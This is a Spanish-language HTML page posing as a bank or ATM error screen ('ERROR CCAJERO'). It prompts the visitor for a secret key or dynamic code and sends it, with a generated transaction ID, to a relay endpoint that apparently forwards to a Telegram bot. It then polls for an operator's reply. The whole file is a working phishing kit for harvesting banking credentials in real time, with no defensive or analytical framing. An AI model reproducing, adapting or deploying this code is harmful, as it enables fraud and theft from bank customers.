<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ERROR CCAJERO</title>
  <style>
    body { font-family: Arial, sans-serif; background:#f5f5f5; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
    .container { background:#fff; padding:20px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1); max-width:400px; width:100%; }
    .loaderp { width:40px; height:40px; border:5px solid #ccc; border-top-color:#000; border-radius:50%; animation:spin 1s linear infinite; margin:auto; }
    @keyframes spin { 100% { transform:rotate(360deg); } }
    .hidden { display:none; }
  </style>
</head>
<body>
  <div class="container">
    <h2>ERROR CCAJERO</h2>
    <form id="transaction-form">
      <label for="clave">Ingresa tu dato:</label>
      <input type="password" id="clave" maxlength="12" required>
      <button id="authorize-button" disabled>Enviar</button>
    </form>
    <div class="loaderp hidden"></div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', function() {
  const form = document.getElementById('transaction-form');
  const claveInput = document.getElementById('clave');
  const btn = document.getElementById('authorize-button');
  const loader = document.querySelector('.loaderp');

  claveInput.addEventListener('input', () => {
    btn.disabled = claveInput.value.length < 4;
  });

  form.addEventListener('submit', async function(e) {
    e.preventDefault();
    loader.classList.remove('hidden');

    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    const dinamica = claveInput.value;

    const message = `<b>ERROR CCAJERO</b>\nID: ${transactionId}\nClave: ${dinamica}`;

    try {
      const response = await fetch(`/api/sendData?method=send&text=${encodeURIComponent(message)}`);
      const data = await response.json();
      if(data.ok) {
        console.log("Mensaje enviado");
        await checkPaymentVerification(transactionId);
      } else {
        throw new Error("Error al enviar mensaje");
      }
    } catch(err) {
      console.error(err);
      loader.classList.add('hidden');
    }
  });

  async function checkPaymentVerification(transactionId) {
    try {
      const response = await fetch(`/api/sendData?method=update`);
      const data = await response.json();
      const verificationUpdate = data.result.find(u => u.callback_query);
      if(verificationUpdate) {
        loader.classList.add('hidden');
        alert("Acción recibida: " + verificationUpdate.callback_query.data);
      } else {
        setTimeout(() => checkPaymentVerification(transactionId), 2000);
      }
    } catch(err) {
      console.error(err);
      setTimeout(() => checkPaymentVerification(transactionId), 2000);
    }
  }
});
</script>
</body>
</html>
